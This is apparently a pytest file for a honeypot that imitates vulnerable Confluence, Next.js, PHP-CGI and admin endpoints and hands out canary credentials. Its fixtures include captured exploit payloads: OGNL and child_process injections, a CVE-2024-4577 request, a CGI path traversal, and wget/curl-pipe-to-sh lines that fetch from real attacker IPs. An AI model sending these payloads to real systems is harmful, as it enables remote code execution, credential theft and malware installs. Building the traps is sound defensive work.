def test_confluence_extract_oast_callback_no_match():
    assert tbenv._extract_oast_callback("") == ""
    assert tbenv._extract_oast_callback("not a callback") == ""
    # Domain has to be the actual TLD — `notoast.me` is its own TLD-eq,
    # `oast.me` must follow a leading label.
    assert tbenv._extract_oast_callback("oast.me") == ""


def test_render_confluence_login_html_shape():
    body = tbenv.render_confluence_login_html("conf.example", "7.18.1").decode("utf-8")
    assert "Confluence" in body
    assert "7.18.1" in body
    assert "conf.example" in body
    assert "/dologin.action" in body
    assert "atl_token" in body


def test_render_confluence_dark_features_json_shape():
    payload = json.loads(tbenv.render_confluence_dark_features_json())
    assert "siteFeatures" in payload
    assert "userFeatures" in payload


def test_render_confluence_editor_preload_html_shape():
    body = tbenv.render_confluence_editor_preload_html("7.18.1").decode("utf-8")
    assert "editor-preload-container" in body
    assert "7.18.1" in body


async def test_dispatch_confluence_login_action(flux_client):
    resp = await flux_client.get(
        "/login.action",
        headers={"X-Forwarded-For": "203.0.113.71", "Host": "conf.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Confluence" in text
    assert tbenv.CONFLUENCE_VERSION in text
    assert resp.headers.get("X-Confluence-Request-Time")

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "confluence-login"
    assert entry["confluencePath"] == "/login.action"
    assert entry["confluenceMethod"] == "GET"
    assert entry["confluenceHasOgnl"] is False


async def test_dispatch_confluence_ognl_path_extracts_oast_callback(flux_client):
    encoded = (
        "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22"
        "nslookup%20probe123.oast.me%22%29%7D/"
    )
    resp = await flux_client.get(
        encoded,
        headers={"X-Forwarded-For": "203.0.113.72"},
    )
    assert resp.status == 200
    text = await resp.text()
    # Returning the login HTML keeps the scanner believing the OGNL
    # expression evaluated successfully.
    assert "Confluence" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "confluence-ognl-probe"
    assert entry["confluenceHasOgnl"] is True
    assert entry["confluenceOastCallback"] == "probe123.oast.me"
    assert "confluencePayloadPreview" in entry


async def test_dispatch_confluence_createpage_post_extracts_body_callback(flux_client):
    body_bytes = (
        b'queryString=${@org.apache.commons.io.IOUtils@toString('
        b'@java.lang.Runtime@getRuntime().exec("nslookup tag42.interact.sh"))}'
    )
    resp = await flux_client.post(
        "/pages/createpage-entervariables.action",
        data=body_bytes,
        headers={
            "X-Forwarded-For": "203.0.113.73",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "confluence-ognl-probe"
    assert entry["confluenceMethod"] == "POST"
    assert entry["confluenceHasOgnl"] is True
    assert entry["confluenceOastCallback"] == "tag42.interact.sh"


async def test_dispatch_confluence_user_dark_features_returns_json(flux_client):
    resp = await flux_client.get(
        "/users/user-dark-features",
        headers={"X-Forwarded-For": "203.0.113.74"},
    )
    assert resp.status == 200
    payload = await resp.json()
    assert payload == {"siteFeatures": [], "userFeatures": []}

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "confluence-dark-features"


async def test_dispatch_confluence_editor_preload_returns_html(flux_client):
    resp = await flux_client.get(
        "/templates/editor-preload-container",
        headers={"X-Forwarded-For": "203.0.113.75"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "editor-preload-container" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "confluence-editor-preload"


async def test_dispatch_confluence_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "CONFLUENCE_ENABLED", False)
    resp = await flux_client.get(
        "/pages/createpage-entervariables.action",
        headers={"X-Forwarded-For": "203.0.113.76"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Fake Next.js SSJS-injection probe responder ---


def test_nextjs_enabled_by_default():
    assert tbenv.NEXTJS_ENABLED


def test_nextjs_default_paths_cover_observed_probes():
    for path in (
        "/api/endpoint",
        "/api/test",
        "/api/[[...slug]]",
        "/_next/data/abc123/page.json",
        "/_next/data/abc123/index.json",
        "/_next/data/abc123/home.json",
        "/_next/static/chunks/pages/index-deadbeef.js",
        "/api/v2/about",   # Next.js API catch-all + matches Ubiquiti UniFi probes too
    ):
        assert tbenv.is_nextjs_path(path), f"expected match: {path}"


def test_nextjs_path_non_match():
    for path in (
        "/",
        "/index.html",
        "/.env",
        "/wp-login.php",
        # `/static/` without `_next/` prefix is generic, not Next.js.
        "/static/main.js",
    ):
        assert not tbenv.is_nextjs_path(path), f"unexpected match: {path}"


def test_nextjs_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "NEXTJS_ENABLED", False)
    assert not tbenv.is_nextjs_path("/_next/data/abc/page.json")
    assert not tbenv.is_nextjs_path("/api/endpoint")


def test_nextjs_decode_cmd_param_base64():
    payload = (
        "(function(){try{var cmd=\"echo VULN_TEST\";"
        "var r=require('child_process').execSync(cmd).toString();"
        "return r;}catch(e){return 'ERROR';}})()"
    )
    encoded = base64.b64encode(payload.encode()).decode()
    decoded = tbenv._nextjs_decode_cmd_param(f"cmd={encoded}")
    assert "var cmd=\"echo VULN_TEST\"" in decoded
    assert "child_process" in decoded


def test_nextjs_decode_cmd_param_url_safe_base64_no_padding():
    payload = "var cmd = 'echo HELLO'; require('child_process')"
    raw = base64.urlsafe_b64encode(payload.encode()).decode().rstrip("=")
    decoded = tbenv._nextjs_decode_cmd_param(f"cmd={raw}")
    assert "echo HELLO" in decoded


def test_nextjs_decode_cmd_param_falls_back_to_plaintext():
    # Plain `?cmd=id` (not base64) — return as-is so it still gets logged.
    decoded = tbenv._nextjs_decode_cmd_param("cmd=id")
    assert decoded.strip() in {"id", base64.b64decode("id==", validate=False).decode("utf-8", errors="replace")}


def test_nextjs_decode_cmd_param_absent():
    assert tbenv._nextjs_decode_cmd_param("") == ""
    assert tbenv._nextjs_decode_cmd_param("foo=bar") == ""


def test_nextjs_has_ssjs():
    assert tbenv._nextjs_has_ssjs(
        "(function(){var r = require('child_process').execSync('id');})()",
    )
    # The `child-process` (with hyphen) form observed in real probes —
    # not a real Node module but still a probe fingerprint.
    assert tbenv._nextjs_has_ssjs("require('child-process')")
    assert not tbenv._nextjs_has_ssjs("")
    assert not tbenv._nextjs_has_ssjs("plain text, no js eval here")


def test_nextjs_extract_cmd_literal():
    payload = (
        "(function(){try{var cmd = \"echo VULN_TEST\";"
        "var r=require('child_process').execSync(cmd);}})()"
    )
    assert tbenv._nextjs_extract_cmd_literal(payload) == "echo VULN_TEST"
    # Single quotes also supported.
    assert tbenv._nextjs_extract_cmd_literal("var cmd = 'id'") == "id"
    assert tbenv._nextjs_extract_cmd_literal("no cmd here") == ""


def test_nextjs_simulate_command_echo_token():
    assert tbenv._nextjs_simulate_command("echo VULN_TEST") == "VULN_TEST\n"
    assert tbenv._nextjs_simulate_command("echo \"hello world\"") == "hello world\n"


def test_nextjs_simulate_command_unsafe_falls_back_to_error():
    # Anything other than a literal echo of a printable-ASCII token
    # falls back to the scanner's own catch-block sentinel.
    assert tbenv._nextjs_simulate_command("id") == "ERROR"
    assert tbenv._nextjs_simulate_command("cat /etc/passwd | nc x y") == "ERROR"
    assert tbenv._nextjs_simulate_command("") == "ERROR"
    # Non-printable / shell-meta should not be reflected even after `echo `.
    assert tbenv._nextjs_simulate_command("echo $(id)") == "ERROR"
    assert tbenv._nextjs_simulate_command("echo `id`") == "ERROR"


def test_render_nextjs_page_data_shape():
    payload = json.loads(tbenv.render_nextjs_page_data("/_next/data/abc/page.json"))
    assert "pageProps" in payload
    assert payload.get("__N_SSG") is True


def test_render_nextjs_static_chunk_shape():
    body = tbenv.render_nextjs_static_chunk()
    assert b"webpackChunk" in body


async def test_dispatch_nextjs_data_route_returns_pageprops_json(flux_client):
    resp = await flux_client.get(
        "/_next/data/buildId123/index.json",
        headers={"X-Forwarded-For": "203.0.113.81"},
    )
    assert resp.status == 200
    payload = await resp.json()
    assert "pageProps" in payload
    assert resp.headers.get("X-Powered-By") == "Next.js"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "nextjs-page-data"
    assert entry["nextjsHasSsjs"] is False


async def test_dispatch_nextjs_ssjs_probe_reflects_echo_simulation(flux_client):
    # The exact payload shape observed in the wild.
    payload = (
        "(function(){\n"
        "    try {\n"
        "        var cmd = \"echo VULN_TEST\";\n"
        "        var result = require('child-process').execSync(cmd).toString();\n"
        "        return result;\n"
        "    } catch (err) {\n"
        "        return 'ERROR';\n"
        "    }\n"
        "})()"
    )
    encoded = base64.b64encode(payload.encode()).decode()
    resp = await flux_client.get(
        f"/api/endpoint?cmd={encoded}",
        headers={"X-Forwarded-For": "203.0.113.82"},
    )
    assert resp.status == 200
    text = await resp.text()
    # Reflecting the `echo VULN_TEST` literal back is what makes the
    # scanner believe it has a working SSJS RCE — invites a follow-up
    # exploitation payload that we capture in the next request.
    assert text == "VULN_TEST\n"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "nextjs-ssjs-probe"
    assert entry["nextjsHasSsjs"] is True
    assert entry["nextjsCmdLiteral"] == "echo VULN_TEST"
    assert "child-process" in entry["nextjsCmdDecoded"]


async def test_dispatch_nextjs_ssjs_unrecognised_cmd_returns_error_sentinel(flux_client):
    payload = (
        "(function(){var cmd=\"id\";"
        "require('child_process').execSync(cmd);})()"
    )
    encoded = base64.b64encode(payload.encode()).decode()
    resp = await flux_client.get(
        f"/_next/data/buildId/page.json?cmd={encoded}",
        headers={"X-Forwarded-For": "203.0.113.83"},
    )
    assert resp.status == 200
    text = await resp.text()
    # Anything other than a literal `echo <safe>` falls back to the
    # scanner's own catch-block sentinel — tells the scanner SSJS
    # evaluation works but the require failed.
    assert text == "ERROR"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "nextjs-ssjs-probe"
    assert entry["nextjsCmdLiteral"] == "id"


async def test_dispatch_nextjs_static_chunk_returns_js(flux_client):
    resp = await flux_client.get(
        "/_next/static/chunks/pages/index-1234.js",
        headers={"X-Forwarded-For": "203.0.113.84"},
    )
    assert resp.status == 200
    body = await resp.text()
    assert "webpackChunk" in body
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "nextjs-static-chunk"


async def test_dispatch_nextjs_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "NEXTJS_ENABLED", False)
    resp = await flux_client.get(
        "/_next/data/buildId/page.json",
        headers={"X-Forwarded-For": "203.0.113.85"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Cmd-injection trap (/admin/config?cmd=, /printenv, /cgi-bin/printenv) ---


def test_cmd_injection_enabled_by_default():
    assert tbenv.CMD_INJECTION_ENABLED


def test_cmd_injection_default_paths_cover_observed_family():
    for path in (
        "/admin/config",
        "/admin/config.php",
        "/printenv",
        "/cgi-bin/printenv",
        "/cgi-bin/test-cgi",
    ):
        assert tbenv.is_cmd_injection_path(path), f"expected match: {path}"


def test_cmd_injection_path_non_match():
    for path in ["/", "/admin", "/admin/", "/admin/config.php.bak", "/printenv.php", "/etc/printenv"]:
        assert not tbenv.is_cmd_injection_path(path), f"unexpected match: {path}"


def test_cmd_injection_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", False)
    assert not tbenv.is_cmd_injection_path("/admin/config")
    assert not tbenv.is_cmd_injection_path("/printenv")


def test_classify_cmd_injection_command_creds():
    for cmd in (
        "cat /root/.aws/credentials",
        "cat ~/.aws/credentials",
        "cat /home/ubuntu/.aws/credentials",
        "  cat   /root/.aws/credentials  ",
    ):
        assert tbenv.classify_cmd_injection_command(cmd) == "creds-aws", cmd


def test_classify_cmd_injection_command_aws_config():
    assert tbenv.classify_cmd_injection_command("cat /root/.aws/config") == "creds-aws-config"


def test_classify_cmd_injection_command_passwd_env_id_uname():
    assert tbenv.classify_cmd_injection_command("cat /etc/passwd") == "passwd"
    assert tbenv.classify_cmd_injection_command("cat /etc/shadow") == "passwd"
    assert tbenv.classify_cmd_injection_command("printenv") == "env"
    assert tbenv.classify_cmd_injection_command("env") == "env"
    assert tbenv.classify_cmd_injection_command("id") == "id"
    assert tbenv.classify_cmd_injection_command("whoami") == "whoami"
    assert tbenv.classify_cmd_injection_command("uname -a") == "uname"
    assert tbenv.classify_cmd_injection_command("uname") == "uname"
    assert tbenv.classify_cmd_injection_command("hostname") == "hostname"
    assert tbenv.classify_cmd_injection_command("pwd") == "pwd"
    assert tbenv.classify_cmd_injection_command("ls -la") == "ls"


def test_classify_cmd_injection_command_unknown():
    assert tbenv.classify_cmd_injection_command("rm -rf /") == "unknown"
    assert tbenv.classify_cmd_injection_command("nonsense") == "unknown"
    assert tbenv.classify_cmd_injection_command("") == ""


def test_extract_cmd_injection_command_prefers_query_then_form():
    src, key, cmd = tbenv.extract_cmd_injection_command(
        {"cmd": ["whoami"]}, {"cmd": ["id"]},
    )
    assert (src, key, cmd) == ("query", "cmd", "whoami")
    src, key, cmd = tbenv.extract_cmd_injection_command(
        {}, {"command": ["whoami"]},
    )
    assert (src, key, cmd) == ("form", "command", "whoami")
    src, key, cmd = tbenv.extract_cmd_injection_command({}, {})
    assert (src, key, cmd) == ("", "", "")


def test_render_printenv_dump_embeds_aws_canary():
    body = tbenv.render_printenv_dump(FAKE_TRACEBIT, host="victim.example").decode("utf-8")
    assert "AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01" in body
    assert "HOSTNAME=victim.example" in body
    # Per-hit unique synthetic DB password — must not be a fixed literal.
    body2 = tbenv.render_printenv_dump(FAKE_TRACEBIT, host="victim.example").decode("utf-8")
    pw1 = next(line for line in body.split("\n") if line.startswith("DATABASE_URL="))
    pw2 = next(line for line in body2.split("\n") if line.startswith("DATABASE_URL="))
    assert pw1 != pw2, "DATABASE_URL must contain a per-hit-unique password"


def test_render_printenv_dump_sanitises_host_header():
    """An attacker-controlled Host can't smuggle newlines/control chars or
    `=` (which would forge a fake env line) into the dump."""
    body = tbenv.render_printenv_dump(
        FAKE_TRACEBIT, host="victim.example\nINJECTED=yes",
    ).decode("utf-8")
    # The newline and `=` are stripped — the leftover chars get appended to
    # the hostname token but can't break out of the line.
    hostname_lines = [ln for ln in body.split("\n") if ln.startswith("HOSTNAME=")]
    assert len(hostname_lines) == 1, f"hostname must be one line: {hostname_lines}"
    # Two lines named SERVER_NAME and HOSTNAME — both share the sanitized host.
    server_name_lines = [ln for ln in body.split("\n") if ln.startswith("SERVER_NAME=")]
    assert len(server_name_lines) == 1
    # No control character survived.
    assert "\n" not in hostname_lines[0]


async def test_dispatch_admin_config_no_cmd_returns_landing(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    resp = await flux_client.get(
        "/admin/config",
        headers={"X-Forwarded-For": "203.0.113.80"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Admin Configuration" in text
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "cmd-injection-probe"
    assert entries[-1]["cmd"] == ""
    assert entries[-1]["cmdFamily"] == ""


async def test_dispatch_admin_config_cmd_creds_issues_canary(flux_client, monkeypatch):
    """cat /root/.aws/credentials → AWS canary in the response body, logged
    as cmd-injection-creds-leak with cmdFamily=creds-aws."""
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(
        "/admin/config?cmd=cat%20/root/.aws/credentials",
        headers={"X-Forwarded-For": "203.0.113.81"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"AKIAFAKEEXAMPLE01" in body, body
    assert b"aws_secret_access_key" in body
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-creds-leak"
    assert entry["cmdFamily"] == "creds-aws"
    assert entry["cmdSource"] == "query"
    assert entry["cmdKey"] == "cmd"
    assert entry["canaryStatus"] == "issued"


async def test_dispatch_admin_config_cmd_passwd_returns_static(flux_client, monkeypatch):
    """Non-credential commands return static fake output and do NOT mint a
    Tracebit canary."""
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    # No API_KEY needed — no canary is issued for /etc/passwd.
    monkeypatch.setattr(tbenv, "API_KEY", "")
    resp = await flux_client.get(
        "/admin/config?cmd=cat%20/etc/passwd",
        headers={"X-Forwarded-For": "203.0.113.82"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"root:x:0:0:root" in body
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-command"
    assert entry["cmdFamily"] == "passwd"


async def test_dispatch_admin_config_cmd_id_uses_simulate(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    resp = await flux_client.get(
        "/admin/config?cmd=id",
        headers={"X-Forwarded-For": "203.0.113.83"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"uid=33(www-data)" in body


async def test_dispatch_admin_config_php_cmd_id_uses_same_handler(flux_client, monkeypatch):
    """The current log pass found scanners using the PHP-suffixed variant
    of the same exposed admin-config shape."""
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    resp = await flux_client.get(
        "/admin/config.php?cmd=id",
        headers={"X-Forwarded-For": "203.0.113.89"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"uid=33(www-data)" in body
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-command"
    assert entry["cmdInjectionPath"] == "/admin/config.php"


async def test_dispatch_printenv_always_issues_canary(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(
        "/printenv",
        headers={"X-Forwarded-For": "203.0.113.84"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"AWS_SECRET_ACCESS_KEY=" in body
    assert b"AKIAFAKEEXAMPLE01" in body
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-printenv"
    assert entry["cmdFamily"] == "env"


async def test_dispatch_cgi_bin_printenv_routes_through_handler(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(
        "/cgi-bin/printenv",
        headers={"X-Forwarded-For": "203.0.113.85"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-printenv"


async def test_dispatch_admin_config_form_post_extracts_cmd(flux_client, monkeypatch):
    """POST with form-encoded body should also surface the cmd value."""
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    resp = await flux_client.post(
        "/admin/config",
        data="cmd=whoami",
        headers={
            "X-Forwarded-For": "203.0.113.86",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["cmdSource"] == "form"
    assert entry["cmd"] == "whoami"


async def test_dispatch_cmd_injection_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", False)
    resp = await flux_client.get("/admin/config?cmd=id", headers={"X-Forwarded-For": "203.0.113.87"})
    assert resp.status == 404
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "not-handled"


async def test_cmd_injection_canary_failure_falls_back_to_static(flux_client, monkeypatch):
    """If Tracebit issuance fails for a creds-aws cmd, log it but still 200
    with an empty body (no canary leaked, no 502 to tip off the scanner)."""
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")

    async def _failed(*_a, **_kw):
        return None

    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _failed)
    resp = await flux_client.get(
        "/admin/config?cmd=cat%20/root/.aws/credentials",
        headers={"X-Forwarded-For": "203.0.113.88"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["canaryStatus"] == "issue-failed"
    assert entry["cmdFamily"] == "creds-aws"


async def test_dispatch_phpunit_eval_get_body_returns_probe_hash(flux_client):
    payload = b'<?php echo(md5("Hello PHPUnit"));'
    resp = await flux_client.request(
        "GET",
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        data=payload,
        headers={"X-Forwarded-For": "203.0.113.90"},
    )
    assert resp.status == 200
    body = await resp.text()
    assert body == hashlib.md5(b"Hello PHPUnit").hexdigest() + "\n"
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "phpunit-eval-stdin"
    assert entry["bodyBytesRead"] == len(payload)
    assert entry["bodySha256"] == hashlib.sha256(payload).hexdigest()
    assert entry["bodyPreview"].startswith("<?php echo")


async def test_dispatch_php_cgi_rce_decodes_body_command(flux_client):
    command = b"(wget -qO- https://46.151.182.82/sh || curl -sk https://46.151.182.82/sh) | sh"
    encoded = base64.b64encode(command).decode("ascii")
    payload = (
        '<?php shell_exec(base64_decode("%s")); '
        'echo(md5("Hello CVE-2024-4577")); ?>'
    ) % encoded
    resp = await flux_client.post(
        "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
        data=payload,
        headers={"X-Forwarded-For": "203.0.113.91"},
    )
    assert resp.status == 200
    assert await resp.text() == hashlib.md5(b"Hello CVE-2024-4577").hexdigest() + "\n"
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-php-cgi-rce"
    assert entry["cmdSource"] == "body"
    assert entry["cmdKey"] == "php://input"
    assert "46.151.182.82" in entry["decodedCommand"]


async def test_dispatch_apache_cgi_shell_body_logs_stdin_command(flux_client):
    payload = b"(wget --no-check-certificate -qO- https://204.76.203.196/sh || curl -sk https://204.76.203.196/sh) | sh -s apache.selfrep"
    resp = await flux_client.post(
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
        data=payload,
        headers={"X-Forwarded-For": "203.0.113.92"},
    )
    assert resp.status == 200
    assert await resp.read() == b""
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-apache-cgi-shell"
    assert entry["cmdSource"] == "body"
    assert entry["cmdKey"] == "stdin"
    assert "204.76.203.196" in entry["cmd"]


# --- wp-config suffix-variant expansion ---


def test_wp_config_canary_covers_editor_leftover_suffixes():
    """The April 2026 not-handled audit found .save / .swp / .~ / .bak / .txt
    variants outnumbering the bare /wp-config.php — make sure the canary trap
    intercepts every plausible save/swap/comment shape."""
    for path in (
        "/wp-config.php.save",
        "/wp-config.php.swp",
        "/wp-config.php.swo",
        "/wp-config.php.old",
        "/wp-config.php.orig",
        "/wp-config.php.txt",
        "/wp-config.php~",
        "/wp-config.bak",
    ):
        assert tbenv.find_canary_trap(path) is not None, f"missing trap: {path}"


# --- sftp-config canary trap ---


def test_sftp_config_paths_registered():
    for path in (
        "/.vscode/sftp.json",
        "/sftp-config.json",
        "/sftp.json",
        "/.ftpconfig",
    ):
        trap = tbenv.find_canary_trap(path)
        assert trap is not None, f"missing trap: {path}"
        assert trap.name == "sftp-config"


def test_render_sftp_config_json_embeds_gitlab_credentials():
    body = tbenv.render_sftp_config_json(FAKE_TRACEBIT)
    payload = json.loads(body)
    assert payload["username"] == "deploybot42"
    assert payload["password"] == "p@ssCanaryValue"
    assert payload["protocol"] == "sftp"


async def test_dispatch_sftp_config_returns_canary_json(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(
        "/.vscode/sftp.json",
        headers={"X-Forwarded-For": "203.0.113.90"},
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["password"] == "p@ssCanaryValue"
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "sftp-config"


# --- CI/CD config canary trap ---


def test_ci_cd_config_paths_registered():
    expected = {
        "/.github/workflows/deploy.yml": "github-actions-workflow",
        "/.github/workflows/ci.yml": "github-actions-workflow",
        "/.github/workflows/docker.yml": "github-actions-workflow",
        "/.gitlab-ci.yml": "gitlab-ci",
        "/.gitlab/.gitlab-ci.yml": "gitlab-ci",
        "/Jenkinsfile": "jenkinsfile",
        "/bitbucket-pipelines.yml": "bitbucket-pipelines",
        "/appveyor.yml": "generic-ci-config",
        "/.circleci/config.yml": "generic-ci-config",
        "/azure-pipelines.yml": "generic-ci-config",
        "/deployment.yml": "generic-ci-config",
    }
    for path, name in expected.items():
        trap = tbenv.find_canary_trap(path)
        assert trap is not None, f"missing trap: {path}"
        assert trap.name == name


async def test_dispatch_github_actions_workflow_returns_canary_yml(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(
        "/.github/workflows/ci.yml",
        headers={"X-Forwarded-For": "203.0.113.91"},
    )
    assert resp.status == 200
    body = await resp.text()
    assert "AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01" in body
    assert "aws s3 sync" in body
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "github-actions-workflow"


# --- AI editor / coding-assistant config canary expansion ---


def test_ai_toolchain_config_paths_registered():
    """Late-April 2026 dictionary expansion: AI editor + coding-assistant
    + AI infrastructure config paths."""
    expected = {
        "/.claude/settings.json": "claude-settings",
        "/.cline/settings.json": "cline-settings",
        "/.cline/mcp_settings.json": "mcp-config",
        "/mcp_settings.json": "mcp-config",
        "/mcp.json": "mcp-config",
        "/.mcp/mcp.json": "mcp-config",
        "/.continue/config.json": "continue-config",
        "/.sourcegraph/cody.json": "cody-config",
        "/.aider.conf.yml": "aider-conf",
        "/.config/open-interpreter/config.yaml": "open-interpreter-config",
        "/litellm_config.yaml": "litellm-config",
        "/litellm/config.yaml": "litellm-config",
        "/proxy_config.yaml": "litellm-config",
        "/langsmith.env": "langsmith-env",
        "/.huggingface/token": "huggingface-token",
        "/.cache/huggingface/token": "huggingface-token",
        "/.streamlit/secrets.toml": "streamlit-secrets",
        "/openai.json": "openai-config-flat",
        "/anthropic.json": "anthropic-config-flat",
        "/cohere_config.json": "ai-provider-config",
        "/tabnine_config.json": "ai-provider-config",
        "/.bito/config.json": "ai-provider-config",
        "/.codeium/config.json": "ai-provider-config",
        "/.roost/config.json": "ai-provider-config",
        "/pinecone_config.json": "ai-provider-config",
        "/.lobechat/config.json": "ai-provider-config",
        "/chatgpt-next-web.json": "ai-provider-config",
        "/baseten.yaml": "baseten-config",
    }
    for path, name in expected.items():
        trap = tbenv.find_canary_trap(path)
        assert trap is not None, f"missing trap: {path}"
        assert trap.name == name, f"{path} mapped to {trap.name}, expected {name}"


def test_render_claude_settings_embeds_aws_canary():
    body = tbenv.render_claude_settings_json(FAKE_TRACEBIT)
    payload = json.loads(body)
    assert payload["apiKey"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["anthropicApiKey"] == "AKIAFAKEEXAMPLE01"
    # MCP servers stanza ships canary as GitHub PAT — same shape as
    # the existing /.cursor/mcp.json renderer.
    pat = payload["mcpServers"]["github"]["env"]["GITHUB_PERSONAL_ACCESS_TOKEN"]
    assert pat == "AKIAFAKEEXAMPLE01"


def test_render_cline_settings_embeds_aws_canary():
    body = tbenv.render_cline_settings_json(FAKE_TRACEBIT)
    payload = json.loads(body)
    assert payload["apiProvider"] == "anthropic"
    assert payload["apiKey"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["openAiApiKey"] == "AKIAFAKEEXAMPLE01"


def test_render_continue_config_embeds_aws_canary_per_model():
    body = tbenv.render_continue_config_json(FAKE_TRACEBIT)
    payload = json.loads(body)
    keys = {m["apiKey"] for m in payload["models"]}
    assert "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in keys
    assert "AKIAFAKEEXAMPLE01" in keys


def test_render_cody_config_embeds_aws_canary():
    body = tbenv.render_cody_config_json(FAKE_TRACEBIT)
    payload = json.loads(body)
    assert payload["accessToken"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["endpoint"].startswith("https://")


def test_render_aider_conf_embeds_aws_canary():
    body = tbenv.render_aider_conf_yml(FAKE_TRACEBIT).decode("utf-8")
    assert "openai-api-key: AKIAFAKEEXAMPLE01" in body
    assert "anthropic-api-key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body


def test_render_open_interpreter_yaml_embeds_aws_canary():
    body = tbenv.render_open_interpreter_yaml(FAKE_TRACEBIT).decode("utf-8")
    assert "api_key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
    assert "provider: anthropic" in body


def test_render_litellm_config_embeds_aws_canary_in_model_list():
    body = tbenv.render_litellm_config_yaml(FAKE_TRACEBIT).decode("utf-8")
    assert "api_key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
    assert "api_key: AKIAFAKEEXAMPLE01" in body
